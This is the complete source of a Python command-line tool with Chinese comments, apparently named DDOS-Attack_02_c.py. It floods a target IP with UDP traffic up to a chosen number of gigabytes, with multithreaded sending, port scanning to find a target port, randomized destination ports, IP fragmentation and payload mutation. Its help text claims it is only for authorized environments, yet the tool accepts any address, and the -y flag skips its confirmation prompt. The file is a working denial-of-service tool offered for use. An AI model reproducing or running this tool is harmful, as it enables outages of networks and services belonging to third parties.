#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import sys
import os
import time
import socket
import ipaddress
import random
import argparse
import threading
import errno as errno_mod


# ==================== 常量 ====================
IP_HEADER_LEN = 20
UDP_HEADER_LEN = 8
MIN_PAYLOAD = 28
MAX_PAYLOAD = 65000
DEFAULT_PAYLOAD = 1490
FRAG_PAYLOAD = 3000
RATE_LIMITER_MAX_WAIT = 0.1  # 秒
QUICK_SCAN_PORTS = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]


# ==================== 配置 ====================
class Config:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.gb = 0.0
        self.packet_size = -1
        self.num_threads = 4
        self.burst_size = 50
        self.rate_limit = 0.0
        self.duration = 0
        self.src_port_base = -1
        self.random_target_port = False
        self.fragment = False
        self.vary_payload = True
        self.log_file = None
        self.max_retries = 3
        self.assume_yes = False
        self.no_check = False
        self.scan_mode = 1
        self.scan_range = None
        self.max_pps = 0
        self.max_mbps = 0
        # 计算字段
        self.total_packets = 0
        self.payload_size = 0
        self.overhead = 0
        self.total_wire_bytes = 0


# ==================== 统计 ====================
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.attempts = 0
        self.bytes_sent = 0
        self.dropped = 0
        self.err_bind = 0
        self.err_port_unreach = 0
        self.err_io = 0
        self.err_other = 0
        self.recent_errors = []
        self.recent_errors_max = 10
        self.err_limiter = ErrorRateLimiter(5)

    def try_reserve_batch(self, n, limit):
        # 严格预留最多 n 个尝试；返回实际预留数
        with self.lock:
            remaining = limit - self.attempts
            if remaining <= 0:
                return 0
            to_reserve = min(n, remaining)
            self.attempts += to_reserve
            return to_reserve

    def record_error(self, category, tag, detail):
        with self.lock:
            if category == "bind":
                self.err_bind += 1
            elif category == "port_unreach":
                self.err_port_unreach += 1
            elif category == "io":
                self.err_io += 1
            else:
                self.err_other += 1
        if self.err_limiter.allow():
            with self.lock:
                self.recent_errors.append(f"[{tag}] {category}: {detail}")
                while len(self.recent_errors) > self.recent_errors_max:
                    self.recent_errors.pop(0)

    def snapshot(self):
        with self.lock:
            return {
                'sent': self.sent,
                'attempts': self.attempts,
                'bytes': self.bytes_sent,
                'dropped': self.dropped,
                'err_bind': self.err_bind,
                'err_port_unreach': self.err_port_unreach,
                'err_io': self.err_io,
                'err_other': self.err_other,
                'recent_errors': list(self.recent_errors),
            }


class ErrorRateLimiter:
    def __init__(self, max_per_sec):
        self.max_per_sec = max_per_sec
        self.window_start = time.time()
        self.count = 0
        self.suppressed = 0
        self.lock = threading.Lock()

    def allow(self):
        with self.lock:
            now = time.time()
            if now - self.window_start > 1.0:
                self.window_start = now
                self.count = 0
            if self.count < self.max_per_sec:
                self.count += 1
                return True
            self.suppressed += 1
            return False

    def get_suppressed(self):
        with self.lock:
            return self.suppressed


class GlobalRateLimiter:
    # 单例共享令牌桶，长期速率 = burst_size / rate_limit pps
    def __init__(self, seconds_per_burst, burst_size):
        if seconds_per_burst > 0 and burst_size > 0:
            tps = burst_size / seconds_per_burst
            if tps < 0.001:
                print("[!] rateLimit 过大，tokensPerSecond 已下探到 0.001")
                tps = 0.001
            self.tokens_per_second = tps
            self.max_tokens = max(1.0, burst_size * 2.0)
        else:
            self.tokens_per_second = 0
            self.max_tokens = 0
        self.tokens = self.max_tokens
        self.last_refill = time.perf_counter()
        self.cond = threading.Condition()

    def acquire(self, n):
        if self.tokens_per_second <= 0:
            return
        if n <= 0:
            return
        while True:
            with self.cond:
                self._refill()
                if self.tokens >= n:
                    self.tokens -= n
                    return
                needed = n - self.tokens
                needed_sec = needed / self.tokens_per_second
                wait_sec = min(RATE_LIMITER_MAX_WAIT, max(0.001, needed_sec))
                self.cond.wait(wait_sec)

    def _refill(self):
        now = time.perf_counter()
        elapsed = now - self.last_refill
        if elapsed > 0:
            self.tokens = min(self.max_tokens, self.tokens + elapsed * self.tokens_per_second)
            self.last_refill = now


class BandwidthGuard:
    # 同时限制包速率和字节速率
    def __init__(self, max_pps, max_mbps):
        self.max_pps = max_pps
        self.max_bytes_per_sec = max_mbps * 1024 * 1024 / 8 if max_mbps > 0 else 0
        self.window_start = time.perf_counter()
        self.window_packets = 0
        self.window_bytes = 0
        self.lock = threading.Lock()

    def allow(self, pkt_bytes):
        if self.max_pps <= 0 and self.max_bytes_per_sec <= 0:
            return True
        with self.lock:
            now = time.perf_counter()
            if now - self.window_start >= 1.0:
                self.window_start = now
                self.window_packets = 0
                self.window_bytes = 0
            if self.max_pps > 0 and self.window_packets >= self.max_pps:
                return False
            if self.max_bytes_per_sec > 0 and self.window_bytes + pkt_bytes > self.max_bytes_per_sec:
                return False
            self.window_packets += 1
            self.window_bytes += pkt_bytes
            return True


class Logger:
    def __init__(self, path=None):
        self.lock = threading.Lock()
        self.fp = None
        if path:
            try:
                self.fp = open(path, 'a', encoding='utf-8')
                self.fp.write(f"\n--- 会话开始于 {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                self.fp.flush()
            except OSError as e:
                print(f"[!] 无法打开日志文件: {e}", file=sys.stderr)

    def log(self, msg):
        with self.lock:
            print(msg)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def err(self, msg):
        with self.lock:
            print(msg, file=sys.stderr)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def close(self):
        with self.lock:
            if self.fp:
                self.fp.close()
                self.fp = None


# ==================== 辅助 ====================
def check_target(ip, port, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def discover_open_port(ip, port_range, logger):
    logger.log(f"[>] 正在扫描端口 {min(port_range)}-{max(port_range)}...")
    try:
        for p in port_range:
            logger.log(f"[>] 正在探测端口: {p}")
            if check_target(ip, p):
                return p
    except KeyboardInterrupt:
        logger.log("\n[!] 扫描被中断")
        return None
    return None


def select_scan_range(cfg, logger):
    if cfg.scan_range:
        try:
            start_str, end_str = cfg.scan_range.split('-')
            start = int(start_str)
            end = int(end_str)
            if 1 <= start <= end <= 65535:
                return range(start, end + 1)
        except (ValueError, AttributeError):
            logger.err("[!] --scan-range 无效，使用默认")
    if cfg.scan_mode == 2:
        return range(1, 65536)
    return QUICK_SCAN_PORTS


def build_variant_pool(base_size, pool_size, vary, rnd):
    pool = []
    if not vary:
        one = bytearray(rnd.getrandbits(8) for _ in range(base_size))
        pool.append(one)
        return pool
    delta = max(1, base_size // 10)
    for _ in range(pool_size):
        length = base_size - delta + rnd.randint(0, delta * 2)
        length = max(MIN_PAYLOAD, min(length, MAX_PAYLOAD))
        pool.append(bytearray(rnd.getrandbits(8) for _ in range(length)))
    return pool


def mutate_payload(payload, counter, rnd):
    n = len(payload)
    if n >= 8:
        c = counter
        for b in range(8):
            payload[n - 1 - b] = c & 0xFF
            c >>= 8
    if n >= 24:
        for b in range(16):
            idx = 4 + b
            payload[idx] ^= rnd.randint(0, 255)


# ==================== 参数解析 ====================
def parse_args():
    parser = argparse.ArgumentParser(
        description="UDP 洪水模拟器（纯命令行，仅限授权环境）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""示例:
  python3 DDOS-Attack_02_c.py -t 192.168.1.100 -p 53 -g 1
  python3 DDOS-Attack_02_c.py -t 10.0.0.1 -g 1 --scan-mode 1
  python3 DDOS-Attack_02_c.py -t 10.0.0.1 -p 53 -g 1 -P 8 -b 100 -y
  python3 DDOS-Attack_02_c.py -t 10.0.0.1 -p 53 -g 1 --max-pps 10000
"""
    )
    parser.add_argument('-t', '--target', required=True, help='目标 IP')
    parser.add_argument('-p', '--port', type=int, default=None,
                        help='目标端口（省略则自动扫描）')
    parser.add_argument('-g', '--gb', type=float, required=True,
                        help='总流量 (GB)')
    parser.add_argument('-P', '--processes', type=int, default=4,
                        help='线程数（默认 4）')
    parser.add_argument('-T', '--threads', type=int, default=None,
                        help='同 -P（别名）')
    parser.add_argument('-b', '--burst', type=int, default=50,
                        help='每突发包数（默认 50）')
    parser.add_argument('-r', '--rate', type=float, default=0.0,
                        help='每突发秒数，全局速率 = burstSize/rate pps')
    parser.add_argument('-d', '--duration', type=int, default=0,
                        help='持续时间（秒，默认 0 = 直到发完）')
    parser.add_argument('-s', '--src-port', type=int, default=-1,
                        help='源端口基数，-1 = 随机（默认 -1）')
    parser.add_argument('--size', type=int, default=None,
                        help='载荷大小（默认 1490，--fragment 时 3000）')
    parser.add_argument('--random-port', action='store_true',
                        help='每包随机目标端口')
    parser.add_argument('--fragment', action='store_true',
                        help='启用 IP 分片（载荷 3000）')
    parser.add_argument('--no-vary', action='store_true',
                        help='关闭载荷变异')
    parser.add_argument('--max-pps', type=int, default=0,
                        help='包速率上限（0 = 不限）')
    parser.add_argument('--max-mbps', type=int, default=0,
                        help='带宽上限 Mbps（0 = 不限）')
    parser.add_argument('--no-check', action='store_true',
                        help='给出 -p 时跳过 TCP 连通性检查')
    parser.add_argument('--scan-mode', type=int, default=1, choices=[1, 2, 3],
                        help='端口扫描模式：1=快速，2=全端口，3=自定义（--scan-range）')
    parser.add_argument('--scan-range', default=None,
                        help='自定义扫描范围（例如 1-1000）')
    parser.add_argument('-y', '--yes', action='store_true',
                        help='跳过交互确认')
    parser.add_argument('--log', default=None, help='日志文件路径')
    parser.add_argument('--max-retries', type=int, default=3,
                        help='每包最大重试次数（默认 3）')
    parser.add_argument('--selftest', action='store_true',
                        help='运行内部单元测试后退出')
    return parser.parse_args()


def build_config(args):
    cfg = Config()
    try:
        ipaddress.ip_address(args.target)
        cfg.target_ip = args.target
    except ValueError:
        print(f"[!] 无效目标 IP: {args.target}", file=sys.stderr)
        return None

    cfg.target_port = args.port
    if cfg.target_port is not None and not (1 <= cfg.target_port <= 65535):
        print(f"[!] 端口超出范围: {cfg.target_port}", file=sys.stderr)
        return None

    cfg.gb = args.gb
    if cfg.gb <= 0:
        print("[!] GB 必须 > 0", file=sys.stderr)
        return None

    cfg.num_threads = args.threads if args.threads is not None else args.processes
    if cfg.num_threads < 1:
        print("[!] 线程数必须 >= 1", file=sys.stderr)
        return None

    cfg.burst_size = args.burst
    if cfg.burst_size < 1:
        print("[!] 突发大小必须 >= 1", file=sys.stderr)
        return None

    cfg.rate_limit = args.rate
    if cfg.rate_limit < 0:
        print("[!] 速率必须 >= 0", file=sys.stderr)
        return None

    cfg.duration = args.duration
    if cfg.duration < 0:
        print("[!] 持续时间必须 >= 0", file=sys.stderr)
        return None

    cfg.src_port_base = args.src_port
    if cfg.src_port_base != -1 and not (1 <= cfg.src_port_base <= 65535):
        print("[!] src-port 必须为 -1 或 1-65535", file=sys.stderr)
        return None

    if args.size is not None:
        cfg.packet_size = args.size
    elif args.fragment:
        cfg.packet_size = FRAG_PAYLOAD
    else:
        cfg.packet_size = DEFAULT_PAYLOAD

    cfg.random_target_port = args.random_port
    cfg.fragment = args.fragment
    cfg.vary_payload = not args.no_vary
    cfg.max_pps = args.max_pps
    cfg.max_mbps = args.max_mbps
    cfg.no_check = args.no_check
    cfg.scan_mode = args.scan_mode
    cfg.scan_range = args.scan_range
    cfg.assume_yes = args.yes
    cfg.log_file = args.log
    cfg.max_retries = args.max_retries
    if cfg.max_retries < 0:
        print("[!] max-retries 必须 >= 0", file=sys.stderr)
        return None
    return cfg


def finalize_config(cfg):
    if cfg.packet_size < MIN_PAYLOAD:
        cfg.packet_size = MIN_PAYLOAD
    if cfg.packet_size > MAX_PAYLOAD:
        cfg.packet_size = MAX_PAYLOAD
    cfg.payload_size = cfg.packet_size
    cfg.overhead = IP_HEADER_LEN + UDP_HEADER_LEN
    cfg.total_wire_bytes = cfg.payload_size + cfg.overhead
    target_bytes = int(cfg.gb * 1024 * 1024 * 1024)
    cfg.total_packets = target_bytes // cfg.total_wire_bytes
    if cfg.total_packets <= 0:
        cfg.total_packets = 0


# ==================== UDP 套接字工厂 ====================
def open_udp_socket(bind_port, fragment, tag, stats):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except OSError:
        pass
    if bind_port > 0:
        try:
            sock.bind(('', bind_port))
        except OSError as e:
            stats.record_error("bind", tag, f"port {bind_port}: {e}")
    if fragment:
        try:
            if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DONT'):
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER,
                                socket.IP_PMTUDISC_DONT)
        except OSError as e:
            stats.record_error("io", tag, f"fragment setup: {e}")
    return sock


# ==================== 带重试发送 ====================
def send_udp_with_retry(sock, payload, target, max_retries, tag, stats):
    for attempt in range(max_retries + 1):
        try:
            sock.sendto(payload, target)
            return True
        except ConnectionRefusedError:
            stats.record_error("port_unreach", tag, str(target))
        except OSError as e:
            stats.record_error("io", tag, f"E{e.errno}: {e}")
    return False


# ==================== Worker ====================
def udp_worker(thread_id, cfg, stats, limiter, guard, stop_event, logger):
    tag = f"T{thread_id}"
    rnd = random.Random(thread_id * 0x9E3779B1)
    pool = build_variant_pool(cfg.payload_size, 512, cfg.vary_payload, rnd)

    bind_port = cfg.src_port_base + thread_id if cfg.src_port_base >= 0 else 0

    sock = None
    sent = 0
    bytes_sent = 0
    dropped = 0
    last_sent = 0
    last_bytes = 0
    last_dropped = 0
    packet_counter = 0
    consecutive_fail = 0

    try:
        sock = open_udp_socket(bind_port, cfg.fragment, tag, stats)

        while not stop_event.is_set():
            reserved = stats.try_reserve_batch(cfg.burst_size, cfg.total_packets)
            if reserved <= 0:
                break

            try:
                limiter.acquire(reserved)
            except Exception:
                break

            for _ in range(reserved):
                if stop_event.is_set():
                    break

                payload = pool[packet_counter % len(pool)]
                if cfg.vary_payload:
                    mutate_payload(payload, packet_counter, rnd)
                packet_counter += 1

                if cfg.random_target_port:
                    target = (cfg.target_ip, rnd.randint(1, 65535))
                else:
                    target = (cfg.target_ip, cfg.target_port)

                if not guard.allow(cfg.total_wire_bytes):
                    time.sleep(0.001)
                    continue

                if send_udp_with_retry(sock, payload, target, cfg.max_retries, tag, stats):
                    sent += 1
                    bytes_sent += cfg.total_wire_bytes
                    consecutive_fail = 0
                else:
                    dropped += 1
                    consecutive_fail += 1
                    if consecutive_fail >= 3:
                        try:
                            time.sleep(min(1.0, 0.01 * (1 << min(consecutive_fail - 3, 6))))
                        except InterruptedError:
                            break
                        # 通道损坏时重建
                        if sock:
                            try:
                                sock.close()
                            except OSError:
                                pass
                        sock = open_udp_socket(bind_port, cfg.fragment, tag, stats)

            with stats.lock:
                stats.sent += sent - last_sent
                stats.bytes_sent += bytes_sent - last_bytes
                stats.dropped += dropped - last_dropped
            last_sent = sent
            last_bytes = bytes_sent
            last_dropped = dropped

    except Exception as e:
        if not stop_event.is_set():
            stats.record_error("other", tag, f"fatal: {e}")
    finally:
        if sock:
            try:
                sock.close()
            except OSError:
                pass
        with stats.lock:
            stats.sent += sent - last_sent
            stats.bytes_sent += bytes_sent - last_bytes
            stats.dropped += dropped - last_dropped


# ==================== 进度监控 ====================
def monitor_progress(cfg, stats, stop_event, logger):
    start = time.time()
    last_report = start
    last_sent = 0
    try:
        while not stop_event.is_set():
            time.sleep(0.5)
            now = time.time()
            elapsed = now - start
            snap = stats.snapshot()
            if snap['attempts'] >= cfg.total_packets:
                break
            if cfg.duration > 0 and elapsed >= cfg.duration:
                stop_event.set()
                break
            if now - last_report >= 1.0:
                delta_sent = snap['sent'] - last_sent
                dt = now - last_report
                inst = delta_sent / dt if dt > 0 else 0
                avg = snap['sent'] / elapsed if elapsed > 0 else 0
                gb = snap['bytes'] / (1024 ** 3)
                total_err = (snap['err_bind'] + snap['err_port_unreach']
                             + snap['err_io'] + snap['err_other'])
                logger.log(f"[+] sent={snap['sent']} attempts={snap['attempts']}  "
                           f"data={gb:.4f}GB  rate={avg:.0f}pps  inst={inst:.0f}pps  "
                           f"drop={snap['dropped']}  err={total_err}")
                last_report = now
                last_sent = snap['sent']
    except KeyboardInterrupt:
        stop_event.set()


# ==================== 摘要与最终统计 ====================
def print_summary(cfg, logger):
    logger.log("")
    logger.log(f"[+] target={cfg.target_ip}:{cfg.target_port}  proto=UDP  "
               f"traffic={cfg.gb:.2f}GB  packets={cfg.total_packets}  "
               f"threads={cfg.num_threads}  payload={cfg.payload_size}B  wire={cfg.total_wire_bytes}B"
               + ("  random-port" if cfg.random_target_port else "")
               + ("  fragment" if cfg.fragment else ""))
    if cfg.rate_limit > 0:
        logger.log(f"[+] 全局速率: {cfg.burst_size / cfg.rate_limit:.0f} pps")
    if cfg.max_pps > 0:
        logger.log(f"[+] 包速率上限: {cfg.max_pps} pps")
    if cfg.max_mbps > 0:
        logger.log(f"[+] 带宽上限: {cfg.max_mbps} Mbps")
    logger.log(f"[+] 总尝试数严格上限: {cfg.total_packets}")
    logger.log("[+] 攻击中... (Ctrl+C 停止)")


def print_final_stats(cfg, stats, elapsed, logger):
    snap = stats.snapshot()
    gb = snap['bytes'] / (1024 ** 3)
    rate = snap['sent'] / elapsed if elapsed > 0 else 0
    logger.log("")
    logger.log("[=] 完成:")
    logger.log(f"    发送包数:     {snap['sent']}")
    logger.log(f"    丢弃包数:     {snap['dropped']}")
    logger.log(f"    总尝试数:     {snap['attempts']} / {cfg.total_packets}")
    logger.log(f"    总数据量:     {gb:.4f} GB")
    logger.log(f"    耗时:         {elapsed:.2f}s")
    logger.log(f"    平均速率:     {rate:.1f} pps")
    logger.log(f"    错误:         bind={snap['err_bind']} "
               f"port-unreach={snap['err_port_unreach']} "
               f"io={snap['err_io']} other={snap['err_other']} "
               f"(日志抑制={stats.err_limiter.get_suppressed()})")
    if snap['recent_errors']:
        logger.log("    最近错误:")
        for e in snap['recent_errors']:
            logger.log(f"      {e}")


# ==================== 自检 ====================
def run_selftest():
    print("[selftest] 运行中...")
    failed = 0

    # 测试 1：finalize 包大小上下边界 clamp
    cfg = Config()
    cfg.packet_size = 1
    cfg.gb = 1.0
    finalize_config(cfg)
    if cfg.packet_size != MIN_PAYLOAD:
        failed += 1
        print("[selftest] FAIL: 包大小下限 clamp", file=sys.stderr)

    cfg = Config()
    cfg.packet_size = 999_999
    cfg.gb = 1.0
    finalize_config(cfg)
    if cfg.packet_size != MAX_PAYLOAD:
        failed += 1
        print("[selftest] FAIL: 包大小上限 clamp", file=sys.stderr)

    # 测试 2：totalPackets 使用 wire 大小
    cfg = Config()
    cfg.packet_size = 100
    cfg.gb = 1.0
    finalize_config(cfg)
    expected = int(1 * 1024 * 1024 * 1024) // (100 + IP_HEADER_LEN + UDP_HEADER_LEN)
    if cfg.total_packets != expected:
        failed += 1
        print(f"[selftest] FAIL: totalPackets 计算，得到 {cfg.total_packets} 期望 {expected}",
              file=sys.stderr)

    # 测试 3：严格 attempts 上限
    s = Stats()
    reserved_total = 0
    for _ in range(1000):
        reserved_total += s.try_reserve_batch(1, 100)
    if reserved_total != 100:
        failed += 1
        print(f"[selftest] FAIL: reserveAttempt 封顶，得到 {reserved_total}", file=sys.stderr)
    if s.attempts != 100:
        failed += 1
        print("[selftest] FAIL: attempts != 100", file=sys.stderr)

    # 测试 4：极端 rateLimit 下的 GlobalRateLimiter
    try:
        g = GlobalRateLimiter(1_000_000.0, 50)
        if g.tokens_per_second <= 0:
            failed += 1
            print("[selftest] FAIL: tokens_per_second <= 0", file=sys.stderr)
    except Exception as e:
        failed += 1
        print(f"[selftest] FAIL: GlobalRateLimiter 构造: {e}", file=sys.stderr)

    # 测试 5：BandwidthGuard
    bg = BandwidthGuard(100, 0)
    allowed = sum(1 for _ in range(200) if bg.allow(1000))
    if allowed > 100:
        failed += 1
        print(f"[selftest] FAIL: BandwidthGuard 允许 {allowed} > 100", file=sys.stderr)

    # 测试 6：载荷池边界
    rnd = random.Random(42)
    pool = build_variant_pool(1000, 10, True, rnd)
    for p in pool:
        if len(p) < MIN_PAYLOAD or len(p) > MAX_PAYLOAD:
            failed += 1
            print(f"[selftest] FAIL: 载荷越界: {len(p)}", file=sys.stderr)
            break

    if failed == 0:
        print("[selftest] 全部测试通过")
        return True
    print(f"[selftest] {failed} 个测试失败", file=sys.stderr)
    return False


# ==================== 主函数 ====================
def main():
    args = parse_args()

    if args.selftest:
        return 0 if run_selftest() else 1

    cfg = build_config(args)
    if cfg is None:
        return 1

    finalize_config(cfg)
    if cfg.total_packets <= 0:
        print("[!] 最终化后流量太小", file=sys.stderr)
        return 1

    logger = Logger(cfg.log_file)

    # 端口解析
    if cfg.target_port is None:
        logger.log("[>] 未指定端口，启动扫描...")
        ports = select_scan_range(cfg, logger)
        cfg.target_port = discover_open_port(cfg.target_ip, ports, logger)
        if cfg.target_port is None:
            logger.err("[!] 未发现可用端口，无法继续")
            logger.close()
            return 1
        logger.log(f"[+] 探测到端口: {cfg.target_port}")
    elif not cfg.no_check:
        logger.log(f"[>] 检查端口 {cfg.target_port}...")
        if not check_target(cfg.target_ip, cfg.target_port):
            logger.log(f"[!] TCP {cfg.target_port} 不可达（UDP 仍可能有效）")

    stats = Stats()
    limiter = GlobalRateLimiter(cfg.rate_limit, cfg.burst_size)
    guard = BandwidthGuard(cfg.max_pps, cfg.max_mbps)
    stop_event = threading.Event()

    print_summary(cfg, logger)

    # 确认
    if not cfg.assume_yes:
        if not sys.stdin.isatty():
            logger.err("[!] 未检测到 TTY，非交互场景请加 -y/--yes")
            logger.close()
            return 1
        try:
            print("\n[!] 确认攻击 (yes/no): ", end='', flush=True)
            line = input().strip().lower()
            if line != 'yes':
                logger.log("[>] 用户取消")
                logger.close()
                return 0
        except (EOFError, KeyboardInterrupt):
            logger.log("\n[>] 用户取消")
            logger.close()
            return 0

    # 启动 worker
    start_time = time.time()
    workers = []
    for i in range(cfg.num_threads):
        t = threading.Thread(
            target=udp_worker,
            args=(i, cfg, stats, limiter, guard, stop_event, logger),
            daemon=True,
        )
        t.start()
        workers.append(t)

    monitor_progress(cfg, stats, stop_event, logger)

    stop_event.set()
    for t in workers:
        t.join(timeout=2)

    elapsed = time.time() - start_time
    print_final_stats(cfg, stats, elapsed, logger)
    logger.close()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 用户中断", file=sys.stderr)
        sys.exit(1)
